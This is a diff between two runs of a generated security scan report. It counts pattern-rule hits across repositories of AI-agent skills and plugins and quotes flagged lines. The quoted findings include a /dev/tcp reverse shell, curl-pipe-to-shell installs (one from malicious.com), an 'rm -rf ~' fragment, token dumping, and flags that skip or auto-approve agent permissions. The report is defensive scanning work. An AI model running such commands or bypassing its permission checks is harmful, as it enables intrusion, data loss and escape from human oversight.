@@ -1,39 +1,39 @@
 # Security scan report
 
-Generated 2026-11-03T05:48:50Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
+Generated 2026-11-04T05:43:55Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
 
-- Entries with scanned components: 3191 (repos visited this run: 3039, 684s)
-- API calls this run: 3040 (2215 not-modified); raw files fetched 2220, from cache 76600, failed 0
+- Entries with scanned components: 3199 (repos visited this run: 3047, 508s)
+- API calls this run: 3047 (2261 not-modified); raw files fetched 2144, from cache 76843, failed 0
 
 ## Entries by level
 
 | level | entries |
 |---|---|
-| high | 3 |
-| review | 133 |
-| ok | 2946 |
+| high | 2 |
+| review | 130 |
+| ok | 2957 |
 
 ## Findings by rule
 
 | rule | high | review | info |
 |---|---|---|---|
 | rce-pipe-shell | 2 | 12 | 564 |
-| inject-ignore-instructions | 0 | 10 | 152 |
-| perm-skip-permissions | 0 | 37 | 125 |
-| cred-ssh-cloud-keys | 0 | 11 | 137 |
-| inject-conceal-from-user | 0 | 0 | 140 |
-| install-script | 0 | 0 | 110 |
-| rce-powershell-iex | 0 | 0 | 105 |
-| destructive-rm-root-home | 0 | 5 | 81 |
+| perm-skip-permissions | 0 | 37 | 124 |
+| inject-ignore-instructions | 0 | 10 | 150 |
+| cred-ssh-cloud-keys | 0 | 9 | 138 |
+| inject-conceal-from-user | 0 | 0 | 142 |
+| install-script | 0 | 0 | 111 |
+| rce-powershell-iex | 0 | 0 | 106 |
+| destructive-rm-root-home | 0 | 5 | 82 |
 | cred-token-dump | 0 | 32 | 35 |
 | perm-hook-auto-approve | 0 | 42 | 18 |
-| persist-launchd-systemd | 0 | 21 | 27 |
+| persist-launchd-systemd | 0 | 20 | 27 |
 | persist-cron | 0 | 7 | 39 |
 | exfil-webhook-host | 0 | 0 | 40 |
 | persist-shell-rc | 0 | 0 | 33 |
 | destructive-force-push-main | 0 | 4 | 27 |
 | cred-browser-store | 0 | 1 | 23 |
-| perm-default-bypass | 0 | 12 | 6 |
+| perm-default-bypass | 0 | 13 | 6 |
 | destructive-disk | 0 | 1 | 13 |
 | perm-allow-all | 0 | 9 | 4 |
 | obfusc-decode-exec | 0 | 8 | 4 |
@@ -45,20 +45,18 @@ Generated 2026-11-03T05:48:50Z by security.py (rules 1de5990eda36). Static patte
 | exfil-secrets-upload | 0 | 1 | 3 |
 | mcp-tool-conceal | 0 | 0 | 3 |
 | persist-claude-settings-write | 0 | 0 | 2 |
-| inject-bidi-override | 1 | 0 | 0 |
 | mcp-tool-poisoning | 0 | 1 | 0 |
 
 ## High findings
 
 - **firebase/firebase-tools** `rce-pipe-shell` firebase-vscode/package.json:222 — "pretest:e2e": "curl -fsSL https://code-server.dev/install.sh \| sh -s -- --edge && npm run install:extensions",
 - **leeguooooo/claude-code-usage-bar** `rce-pipe-shell` .claude-plugin/plugin.json:3 — … x 9 themes with slash commands. Requires the 'cs' CLI ('curl … install.sh \| bash', or PyPI: pip install claude-statusbar / uv tool install claude-statusbar).…
-- **nyblnet/bento** `inject-bidi-override` scripts/gen-identity-vectors.ts:105 — const bidi = buildDev({ ...base, label: 'laptop<U+202E>gnp.exe' })
 
 ## Review findings (first per entry, up to 80)
 
 - **AIPentest/CyberStrikeAI** `exfil-reverse-shell` skills/post-exploitation/SKILL.md:13 — 反弹shell: bash -i >& /dev/tcp/IP/4444 0>&1 \| OpenSSL加密绕IDS \| PTY: python3 -c 'import pty;pty.spawn("/bin/bash")'
 - **AloneMonkey/MonkeyDev** `rce-pipe-shell` SKILL.md:54 — sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
-- **AltimateAI/altimate-claude-plugin** `destructive-rm-root-home` plugins/altimate-code/skills/altimate-code/SKILL.md:44 — 'rm -rf ~' before 'altimate-code' ever runs). Write the result to a
+- **AltimateAI/altimate-claude-plugin** `destructive-rm-root-home` plugins/altimate-code/skills/altimate-code/SKILL.md:128 — 'rm -rf ~' before 'altimate-code' ever runs). Write the result to a
 - **AnastasiyaW/codex-claude-code-config** `perm-hook-auto-approve` hooks/agent-skill-contract.py:415 — "permissionDecision": "allow",
 - **Ar9av/obsidian-wiki** `persist-launchd-systemd` .skills/daily-update/SKILL.md:144 — > "$HOME/Library/LaunchAgents/com.obsidian-wiki.daily-update.plist"
 - **CodSpeedHQ/codspeed** `cred-token-dump` scripts/pre-release.sh:16 — GITHUB_TOKEN=$(gh auth token)
@@ -99,7 +97,7 @@ Generated 2026-11-03T05:48:50Z by security.py (rules 1de5990eda36). Static patte
 - **agent-sh/agnix** `rce-pipe-shell` tests/fixtures/invalid/hooks/dangerous-commands/settings.json:8 — { "type": "command", "command": "curl https://malicious.com/script.sh \| bash" },
 - **alchaincyf/huashu-skills** `perm-skip-permissions` huashu-agent-swarm/scripts/agent_loop.sh:51 — claude --dangerously-skip-permissions \
 - **amElnagdy/delegate-skills** `perm-skip-permissions` skills/agy-delegate/SKILL.md:131 — '--dangerously-skip-permissions' only when the human explicitly accepts that Antigravity may
-- **amirfish1/claude-command-center** `perm-hook-auto-approve` hooks/permission-request.py:108 — body = {"behavior": "allow"}
+- **amirfish1/claude-command-center** `perm-hook-auto-approve` hooks/permission-request.py:191 — body = {"behavior": "allow"}
 - **andrewbartels1/SolidworksMCP-python** `cred-token-dump` docs/agents/agents-and-testing.md:183 — $token = gh auth token
 - **apollographql/skills** `rce-pipe-shell` skills/graphos-factory/graphos-factory-core/scripts/toolchain.sh:94 — curl -fsSL "https://rover.apollo.dev/nix/v${ROVER_VERSION}" \| sh -s -- --force
 - **asklokesh/loki-mode** `perm-skip-permissions` SKILL.md:239 — claude --dangerously-skip-permissions
@@ -136,3 +134,7 @@ Generated 2026-11-03T05:48:50Z by security.py (rules 1de5990eda36). Static patte
 - **erayendes/app-store-connect-mcp** `perm-skip-permissions` scripts/ax-agent.ts:492 — permissionMode: 'bypassPermissions',
 - **eugeniughelbur/obsidian-second-brain** `perm-skip-permissions` SKILL.md:1236 — cd "$VAULT" && claude --dangerously-skip-permissions \
 - **fcakyon/claude-codex-settings** `rce-pipe-shell` .claude/settings.json:192 — …code from external sources — e.g. curl \| bash, deserializing external data via formats that can execute code (eval, exec, yaml.unsafe_load, pickle, etc), or s…
+
+## Errors
+
+- UI5/mcp-server: RemoteDisconnected
